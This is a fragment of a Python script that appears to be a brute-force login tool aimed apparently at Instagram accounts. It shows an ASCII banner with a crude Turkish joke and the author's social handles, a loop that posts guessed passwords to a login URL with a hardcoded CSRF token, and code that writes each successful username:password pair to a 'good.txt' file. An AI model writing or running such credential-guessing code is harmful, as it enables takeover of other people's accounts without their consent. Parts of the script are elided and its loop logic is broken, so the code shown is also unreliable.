...
print(detect_color+'''
      ...
      4$$$$             .$$$$$$$$$$$$$$c
       $$$$b           .$$$$$$$$$$$$$$$$r
          $$$.        .$$$$$$$$$$$$$$$$$$
           $$$c      .$$$$$$$  "$$$$$$$$$r
        ( YRk Layne'ye Hoş Geldiniz.Sex yapmak amaçlı!)
''')

print ('''
==============================================
[developer-instagram] =>7nd0r [snapchat] => enesh7n
==============================================
''')
...
for password in password:
        ...
        with requests.Session() as s:
            r = s.post(login_url, data=payload, headers={
                ...
                "x-csrftoken": 'AAESkJGVHVjpB44vidFWUyy_hHc6eMBD72E'
            })
        for i in range(2):
            if i ==1:
            ...
            if 'userId' in r.text:
                ...
                with open('good.txt', 'a') as x:
                    x.write(user + ':' + password + '\n')
            if 'error' in r.text:
                print((normal_color+'' + user + ' : ' + password + ' --> Sorry, there was a problem with your order'))
